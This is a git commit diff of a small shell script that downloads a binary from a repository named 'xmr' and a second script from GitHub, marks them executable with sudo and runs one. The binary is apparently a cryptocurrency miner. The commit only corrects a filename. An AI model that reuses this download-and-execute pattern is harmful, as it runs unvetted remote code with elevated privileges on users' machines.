ebf7c1d33d275b5f1a45c42b0a1cb5bff9994ecf
renilo <88342640+renilo@users.noreply.github.com>
2021-10-29 02:18:48 +0700

    Update xautokontol1.sh

--- xautokontol1.sh
+++ xautokontol1.sh
@@ -8,6 +8,6 @@ wget https://github.com/renilo/xmr/raw/main/meki-baru1
 
 wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
 
-sudo chmod +x xhajar.sh meki-baru1
+sudo chmod +x xhajar1.sh meki-baru1
 
 ./xhajar1.sh
